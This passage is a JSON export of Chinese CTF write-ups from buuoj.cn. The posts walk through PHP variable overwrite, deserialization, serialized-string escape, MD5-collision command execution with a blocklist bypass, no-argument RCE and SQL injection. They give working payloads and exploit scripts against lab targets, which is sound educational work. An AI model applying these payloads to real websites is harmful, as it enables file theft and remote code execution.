$y;//把post传入的变量x前添加$\n}\n\nforeach($_GET as $x => $y){\n    $$x = $$y;//把get传入的x,y前添加$\n}\n\nforeach($_GET as $x => $y){\n    if($_GET['flag'] === $x && $x !== 'flag'){\n        exit($handsome);//判断get传进来的值是否等于flag\n    }\n}\n\nif(!isset($_GET['flag']) && !isset($_POST['flag'])){\n    exit($yds);//get和post有一方传flag，输出$yds\n}\n\nif($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){\n    exit($is);//get和post不能传flag=flag\n}\n\necho \"the flag is: \".$flag;%\n```\n考点是变量覆盖漏洞\n先了解下概念：\n\n> $$这种写法称为可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。\n> 使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。\n\n[引用](https://www.jianshu.com/p/a4d782e91852)个例子：\n\n```php\n<?php\nforeach ($_GET as $key => $value) {\n${$key} = $value;\n}\necho $a;\n?>\n```\n传入的数据\\$key和\\$value，\\${$key}用了get传进来的\\$key做为新的变量,之后再将get传进来的\\$value赋值给它。假如?a=1 经过覆盖就会解析为\\$a=1。就造成了变量覆盖。\n#### 解题\n感觉有点绕，但通过flag.php，我们知道是要get传入一个$flag，post一个flag，这样，就能\\$flag = file_get_contents('/flag');\n那么先看get吧，首先我们传入一个yds=flag\n\n```php\n$$x = $$y之后就变成了$yds=$flag，$flag就是我们要得到flag的值\n```\n\n再post一个\\$flag=flag\n\n```php\npost经过$$x = $y变成了$$flag = flag\n```\n\n由于\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601104720738.png)\n只要get和post没有\\$flag参数，就输出\\$yds，我们传入的值为\n\n```php\nget：yds\npost: $flag\n```\n实际被覆盖之后是\n\n```php\nget：$yds\npost：$$flag\n```\n满足没有\\$flag的条件\n因此可以exit(\\$yds)\n而\\$yds=\\$flag，\\$$flag=flag\n最终就可以执行\\$flag = file_get_contents('/flag');\n把值传上去得到flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601105450804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n","tags":["代码审计","变量覆盖"],"categories":["buu刷题"]},{"title":"网鼎杯2020青龙组——AreUSerialz","url":"/2020/05/31/buu7——[wangdingbei 2020 青龙组]AreUSerialz/","content":"\n平台：buuoj.cn\n打开靶机即得源码\n分析一下\n\n```php\n<?php\n\ninclude(\"flag.php\");\n\nhighlight_file(__FILE__);\n\nclass FileHandler {\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n\n    public function process() {\n        if($this->op == \"1\") {\n            $this->write();//op=1时，执行write()中的file_put_contents\n        } else if($this->op == \"2\") {\n            $res = $this->read();//op=2时，执行read()中的file_get_contents\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n\n    private function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }//长度过长检测\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n\n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n\n    private function output($s) {\n        echo \"[Result]: <br>\";\n        echo $s;\n    }\n\n    function __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";//强类型比较，函数调用结束时op=2调整为1\n        $this->content = \"\";\n        $this->process();\n    }\n\n}\n\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;//判断传入的字符串是否为可打印字符\n}\n\nif(isset($_GET{'str'})) {\n\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }//反序列化传入的字符串\n\n}\n```\n#### 解题\n考点是反序列化漏洞，我们需要将filename=flag.php序列化传入。\n首先传入的字符串会经过is_vaild检测，传入的payload均要是可打印字符，但protected类型会加上%00进行标识，%00被url解码后ASCII值为0，不在32-125之间，导致不能通过。\n绕过：php7对类的修饰不敏感，直接把属性修饰为public，正常序列化即可\n第二部分是函数调用结束后__destruct会自动把op的值改为1\nop===\"2\"类型和数值都必须等于'2'，后调用process又进行op==“2”不检查类型，使用弱类型2 == \"2\"设置op是数字2进行绕过即可。\n构造exp如下：\n\n```php\n<?php\nclass FileHandler{\n    public $op;\n    public $filename;\n    public $content;\n}\n$payload = new FileHandler();\n$payload->op = 2;\n$payload->filename = \"flag.php\";\n$payload->content = \"whatever\";\necho serialize($payload);\n```\n源码处得到flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200531084603115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\nbuu上应当是改了路径，比赛的flag.php的是要通过cmdline读取它的绝对路径才能得到flag.php的位置。\n","tags":["serialize","代码审计"],"categories":["buu刷题"]},{"title":"安洵杯2019——easy_web","url":"/2020/05/31/buu8——[anxunbei 2019]easy_web/","content":"\n平台：buuoj.cn\n打开靶机来自web狗的卑微（多么痛的领悟~）\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200531140248781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n源码里是左上角图片的base64形式，url里有base64字符串，解码看看\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200531140416422.png)\n两次base64一次hex\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200531140518911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n既然通过文件名构造字符串，那么用index.php试试\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200531140935663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n传入img得到index.php的base64源码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200531141154528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n解码得源码如下\n\n```php\n<?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '<img src =\"./ctf3.jpeg\">';\n    die(\"xixi～ no flag\");//读不了flag.*\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"<img src='data:image/gif;base64,\" . $txt . \"'></img>\";\n    echo \"<br>\";\n}\necho $cmd;\necho \"<br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"<br>\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;\n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n?>\n<html>\n<style>\n  body{\n   background:url(./bj.png)  no-repeat center center;\n   background-size:cover;\n   background-attachment:fixed;\n   background-color:#CCCCCC;\n}\n</style>\n<body>\n</body>\n</html>\n```\n前面得$file参数过滤了flag关键词，所以我们的重点是第二个参数cmd。\n来看第二部分，首先是第一个preg_match，过滤了大部分的命令执行，接着是一个md5强碰撞。\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020053114221480.png)\n要求post a和b，不能是同一个字符串但是md5之后类型和数值相同。\n在网上找到的：\n\n```php\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2\n&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n```\n\n然后我们就可以通过cmd执行命令\n不能用ls但是用dir，看看flag在哪\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200531150757582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n接下来就是读flag\n预期解（其中一个）：\nsort命令\n\n> sort 命令将以默认的方式将文本文件的第一列以ASCII 码的次序排列，并将结果输出到标准输出。\n\n读到flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020053115110354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n非预期：\n过滤反斜杠 |\\\\|\\\\\\\\| 这里的正则没有写好，因此造成了 ca\\t 命令可以直接读取 flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200531151632433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n","tags":["代码审计"],"categories":["buu刷题"]},{"title":"GXYCTF2019——禁止套娃","url":"/2020/05/30/buu6——[GXYCTF2019]禁止套娃/","content":"\n平台：buuoj.cn\n打开靶机\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020053011052181.png)\n查看源码、http头没发现后用扫描器扫一下\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020053011062272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n有git泄露，用githack把源码下下来\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200530110750174.png)\n查看index.php源码如下\n\n```php\n<?php\ninclude \"flag.php\";\necho \"flag在哪里呢？<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"还差一点哦！\");\n            }\n        }\n        else{\n            die(\"再好好想想！\");\n        }\n    }\n    else{\n        die(\"还想读flag，臭弟弟！\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n```\n分析一下\n包含flag.php，get传参exp，第一个preg_match限制了一些伪协议禁止读取文件\n接着是正则，(?R)引用当前表达式，(?R)?代表可以有引用，也可以没有，引用则变成`[a-z,_]+\\([a-z,_]+\\((?R)?\\)\\)`的形式，可以一直迭代下去。这样可以匹配一些诸如print(echo(1))括号和字符组成的字符集\n第二个preg_match正则掉了一些字眼，一些函数不可使用\n考点是无参数RCE\n解题之前先了解几个函数\n\n> localeconv()：函数返回一包含本地数字及货币格式信息的数组。\nscandir()：列出指定路径中的文件和目录\ncurrent()：返回数组中的当前单元, 默认取第一个值。\npos()：current() 的别名。\nnext()：把指向当前元素的指针移动到下一个元素的位置,并返回当前元素的值\narray_reverse()：返回单元顺序相反的数组 \nhighlight_file — 语法高亮一个文件\n\n我们知道index.php包含了一个flag.php，可以构造exp探测其存在：\n\n```php\n?exp=print_r(scandir(current(localeconv())));\n或者\n?exp=print_r(scandir(pos(localeconv())));\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200530115039658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n所以我们的目标就变成了读取倒数第二个文件也就是flag.php。\n这时可以利用array_reverse()先把数组的顺序颠倒，这时候index.php就变成了第一个元素，在用next()把指针移到index.php的下一个元素，也就是flag.php，这样，就达成了我们的目的\n用highlight_file 输出\n\n```php\n?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))))\n```\n传入得到flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200530120322629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n在[王叹之师傅](https://www.cnblogs.com/wangtanzhi/p/12260986.html)wp里发现另外两个解法\n1.用array_flip()以及array_rand()将flag.php从数组中随机出来\n\n> array_flip — 交换数组中的键和值\n> 从数组中随机取出一个或多个单元 \n\n传个三四次即可读出flag.php\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200530120752558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n2.session利用\n启用PHPSESSID\n\n> session_id ：获取/设置当前会话 ID\nsession_start ：启动新会话或者重用现有会话\n构造\n\n```php\n?exp=readfile(session_id(session_start()));\n```\n并手动把cookie设成flag.php\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200530122023966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n成功得到flag\n","tags":["serialize","代码审计","无参数rce"],"categories":["buu刷题"]},{"title":"0CTF2016——piapiapia","url":"/2020/05/29/buu5——[0CTF 2016]piapiapia/","content":"\n平台：buuoj.cn\n打开靶机如下：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529114742390.png)\n弱密码，sql乱试一波没反应，注册个账号进去之后让我们更新信息\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529135044826.png)\n提交跳转到profile.php\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529135145952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)扫一下网站目录。(我们在做题扫目录的时候经常会遇见429的情况，这时候就需要调整一下扫描参数，比如dirsearch添加个延时参数，这样就大大提高了扫描效率)\n\n最后结果如下：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529120508948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n还是有好多没扫出来（逃）\n源码泄露，下载下来解压如下：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529120644467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n在config.php里看见了flag，但不可读\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020052913554473.png)\nprofile.php里有反序列化\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529135655165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n后面我们看到了\\$photo变量有经过file_get_contents处理，这里出现了利用点，如果我们把\\$profile['photo']替换为config.php，那么我们就能读取config.php里的flag\n在源码里整理一下逻辑结构\nregister->login->update->profile\n登录和注册不看，从update开始![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529142525697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)对各个参数进行一些过滤，然后序列化$profile，跟进update_profile\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020052914231416.png)\n跟进过滤\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529142403913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n这里正则把一些操纵函数替换成hacker\n#### 分析\n前面已经知道，我们的目的是要读取config.php从而得到flag，读取config.php需要替换\\$profile['photo']，也就是要让config,php成为序列化的一部分，可以利用的是反序列化字符串逃逸\n\n> 在后端中，反序列化是以\";}结束的，因此如果我们把\";}带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前结束而后面的内容就会被丢弃\n\n由\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529144614865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n可以得知他序列化后的字符串应为:\n\n```php\na:4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:12:\"12345@qq.com\";s:8:\"nickname\";s:3:\"123\";s:5:\"photo\";s:39:\"upload/07cc694b9b3fc636710fa08b6922c42b\";}\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529163306313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n把config.php从nickname塞进去就变成了\n\n```php\na:4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:12:\"12345@qq.com\";s:8:\"nickname\";s:3:\"123\";s:5:\"photo\";s:10:\"config.php\";}s:39:\"upload/07cc694b9b3fc636710fa08b6922c42b\";}\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529163235797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n虽然给他反序列化之后结果photo的部分是config,php，但这样是读不到config.php的，因为更新profile的时候根本没地方插进去，因此就需要从nickname入手把这些数据悄悄带进去\n首先解决nickname的长度限制问题\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529150902174.png)\n直接将nickname变成数组就可突破限制\n\n```php\na:4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:12:\"12345@qq.com\";s:8:\"nickname\";a:1:{i:0;s:3:\"123\";}s:5:\"photo\";s:10:\"config.php\";}s:39:\"upload/07cc694b9b3fc636710fa08b6922c42b\";}\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529163201857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n现在我们考虑怎么让\";}s:5:\"photo\";s:10:\"config.php\";}这34个字符逃逸出来\n前面提到Fliter会将where一类的函数替换成hacker，也就是说where在被正则替换后，其本身的长度会加1，如果我们构造34个where\n\n```php\n34*5 = 170\t170+34个字符=204=len(''hacker\")*34\n```\n那么在传入后端之后hacker的长度就会将我们目标逃逸字符挤掉\n过程如下\n\n```php\n传入:\ns:8:\"nickname\";a:1:{i:0;s:204:\"34*where\";}s:5:\"photo\";s:10:\"config.php\";}\n\n此时34*where\";}s:5:\"photo\";s:10:\"config.php\";}都作为nickname存在\n\n正则替换:\ns:8:\"nickname\";a:1:{i:0;s:204:\"34*hacker\";}s:5:\"photo\";s:10:\"config.php\";}\n\n因为s只有204个字符,所以读取第34个hacker之后就停止,34个字符\";}s:5:\"photo\";s:10:\"config.php\";}不再包含在nickname内\n\n```\n既然从nickname逃逸出，`\"};`将前面的nickname数组闭合之后，剩下的`s:5:\"photo\";s:10:\"config.php\";}`就会被当作photo的部分了，至于后面的upload，由于被后面`\";}`结束反序列化，也就被丢弃，这样就实现了config.php的读取\n#### 解题\n登陆注册之后用burp抓个包将nickname改为数组,构造内容\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529163924397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n访问profile后在源码里发现base字符串\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529164040579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n解码即得flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200529164103853.png)","tags":["代码审计","反序列化字符串逃逸"],"categories":["buu刷题"]},{"title":"ZJCTF2019——NiZhuanSiWei","url":"/2020/05/28/buu4——[ZJCTF 2019]NiZhuanSiWei/","content":"\n平台：buuoj.cn\n打开靶机源码如下：\n\n```php\n<?php  \n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\n$password = $_GET[\"password\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"welcome to the zjctf\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        echo \"Not now!\";\n        exit(); \n    }else{\n        include($file);  //useless.php\n        $password = unserialize($password);\n        echo $password;\n    }\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\nget传入三个变量。\n两个if判断，第一个判断text变量是否存在并判断\"welcome to the zjctf\"是否被写入，true则输出写入的内容，第二个if先过滤了flag，然后包含file，提示了useless.php，接着反序列化password\n一步步来。\n第一层file_get_contents会造成文件包含漏洞，这可以利用data伪协议通过\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200528110141477.png)\n可以加base64防止过滤，这里就直接加上内容即可，构造payload：\n\n```\n?text=data://text/plain,welcome to the zjctf\n```\n第二部分利用filter来读源码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200528110437468.png)\n\n```\n?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php\n```\n执行后得到useless.php的base64源码：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200528110758903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n解码如下:\n\n```php\n<?php  \n\nclass Flag{  //flag.php  \n    public $file;  \n    public function __tostring(){  \n        if(isset($this->file)){  \n            echo file_get_contents($this->file); \n            echo \"<br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        }  \n    }  \n}  \n?>  \n\n```\n有个flag.php，file可控，接着输出对象，那么可以在此基础构造password序列化：\n\n```php\n<?php  \n\nclass Flag{  //flag.php  \n    public $file;  \n    public function __tostring(){  \n        if(isset($this->file)){  \n            echo file_get_contents($this->file); \n            echo \"<br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        }  \n    }  \n}\n\n$payload = new Flag();\n$payload->file = \"flag.php\";\necho serialize($payload);\n//O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\n最终得到得payload为：\n\n```\n?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php&password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n嗯？没反应，原来是第二步还是读了源码没改过来，那么是：\n```\n?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n成功回显：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200528112327758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\nflag在源码里：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200528112356958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n\n","tags":["serialize","代码审计"],"categories":["buu刷题"]},{"title":"网鼎杯2018——Fakebook","url":"/2020/05/27/buu3——[wangdingbei 2018]Fakebook/","content":"\n平台：buuoj.cn\n打开靶机\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200527112543783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n有个登录和注册，打开登录框看看\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200527112631443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n万能密码，sql注入fuzz，弱密码全跑一遍，没什么变化，那就注册看看。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200527112817480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n进去之后出现用户记录。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020052711293410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n点进用户名看看，这是注意到url：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200527113017624.png)\n有可能存在注入，试着让他报错。\n单引号测试：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200527115727293.png)\n可以看到除了数据库错误外，还直接显示出了物理路径。\n把东西先注出来再说，这里过滤了一些东西，我这就直接sqlmap跑一下了，加个--no-cast参数\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200527120409839.png)\n当然可以手注，看别的师傅是用报错成功注入\n一系列流程走一遍最后发现除了admin和passwd外，注出来有个列里有个data序列化字符串：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200527120754256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n嗯。。。忽略了一个东西，dirsearch扫一下发现有个robots.txt和flag.php，flag.php应该就是要读取flag的地方了，robots.txt提示有个index,php.bak备份文件，下下来看看：\n\n```php\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();\n\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        $output = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return 